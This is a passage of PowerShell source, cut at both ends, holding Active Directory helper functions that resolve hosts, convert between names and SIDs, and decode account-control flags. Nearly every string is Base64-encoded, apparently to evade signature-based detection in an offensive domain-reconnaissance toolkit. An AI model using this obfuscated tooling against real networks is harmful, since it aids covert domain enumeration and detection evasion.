    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJOZXR3b3Jr")))) {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1Jlc29sdmUtSVBBZGRyZXNzXSBDb3VsZCBub3QgcmVzb2x2ZSAkQ29tcHV0ZXIgdG8gYW4gSVAgQWRkcmVzcy4=")))
            }
        }
    }
}


function ConvertTo-SID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                $DN = Convert-ADName -Identity $Object -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE4="))) @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                    $UserName = $DN.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]

                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserName
                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain
                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
                        $Domain = $Object.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[0]
                        $Object = $Object.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
                    }
                    elseif (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnRUby1TSURdIEVycm9yIGNvbnZlcnRpbmcgJERvbWFpblwkT2JqZWN0IDogezB9"))) -f $_)
                }
            }
        }
    }
}


function ConvertFrom-SID {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
            try {
                
                Switch ($TargetSid) {
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTA=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnVsbCBBdXRob3JpdHk="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTAtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9ib2R5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTE=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V29ybGQgQXV0aG9yaXR5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTEtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXZlcnlvbmU="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTI=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgQXV0aG9yaXR5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWw="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZSBMb2dvbiA="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTM=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBBdXRob3JpdHk="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lcg=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cA=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lciBTZXJ2ZXI="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cCBTZXJ2ZXI="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXIgUmlnaHRz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTQ=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uLXVuaXF1ZSBBdXRob3JpdHk="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlhbHVw"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmV0d29yaw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmF0Y2g="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJhY3RpdmU="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZQ=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5vbnltb3Vz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHk="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50ZXJwcmlzZSBEb21haW4gQ29udHJvbGxlcnM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsIFNlbGY="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTE=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0aGVudGljYXRlZCBVc2Vycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTI=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdHJpY3RlZCBDb2Rl"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTM=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGVybWluYWwgU2VydmVyIFVzZXJz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTQ=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIEludGVyYWN0aXZlIExvZ29u"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTU=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTc=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTg=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgU3lzdGVt"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTk=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtODAtMA==")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsIFNlcnZpY2VzIA=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBZG1pbmlzdHJhdG9ycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxVc2Vycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxHdWVzdHM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQb3dlciBVc2Vycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2NvdW50IE9wZXJhdG9ycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxTZXJ2ZXIgT3BlcmF0b3Jz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmludCBPcGVyYXRvcnM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxCYWNrdXAgT3BlcmF0b3Jz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZXBsaWNhdG9ycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2Vycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxOZXR3b3JrIENvbmZpZ3VyYXRpb24gT3BlcmF0b3Jz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxJbmNvbWluZyBGb3Jlc3QgVHJ1c3QgQnVpbGRlcnM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBMb2cgVXNlcnM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxXaW5kb3dzIEF1dGhvcml6YXRpb24gQWNjZXNzIEdyb3Vw"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxUZXJtaW5hbCBTZXJ2ZXIgTGljZW5zZSBTZXJ2ZXJz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnM="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTY5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDcnlwdG9ncmFwaGljIE9wZXJhdG9ycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTcz")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxFdmVudCBMb2cgUmVhZGVycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgUmVtb3RlIEFjY2VzcyBTZXJ2ZXJz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgTWFuYWdlbWVudCBTZXJ2ZXJz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3Jz"))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTgw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnRGcm9tLVNJRF0gRXJyb3IgY29udmVydGluZyBTSUQgJyRUYXJnZXRTaWQnIDogezB9"))) -f $_)
            }
        }
    }
}


function Convert-ADName {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlTWV0aG9k"))), $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0UHJvcGVydHk="))), $NULL, $Object, $Parameters)
        }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0VHlwZQ==")))]) {
                if ($TargetIdentity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XltBLVphLXpdK1xcW0EtWmEteiBdKw==")))) {
                    $ADSOutputType = $NameTypes[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl")))]
                }
                else {
                    $ADSOutputType = $NameTypes[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQ0")))]
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdEV4"))) (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyA6IHswfQ=="))) -f $_)
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdA=="))) (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIDogezB9"))) -f $_)
                }
            }

            
            Set-Property $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhc2VSZWZlcnJhbA=="))) (0x60)

            try {
                
                $Null = Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0"))) (8, $TargetIdentity)
                Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0"))) ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciB0cmFuc2xhdGluZyAnJFRhcmdldElkZW50aXR5JyA6IHswfQ=="))) -f $($_.Exception.InnerException.Message))
            }
        }
    }
}


function ConvertFrom-UACValue {


    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0NSSVBU"))), 1)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QUNDT1VOVERJU0FCTEU="))), 2)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRURJUl9SRVFVSVJFRA=="))), 8)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TE9DS09VVA=="))), 16)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX05PVFJFUUQ="))), 32)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX0NBTlRfQ0hBTkdF"))), 64)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQ="))), 128)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VEVNUF9EVVBMSUNBVEVfQUNDT1VOVA=="))), 256)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9STUFMX0FDQ09VTlQ="))), 512)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SU5URVJET01BSU5fVFJVU1RfQUNDT1VOVA=="))), 2048)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVA=="))), 4096)
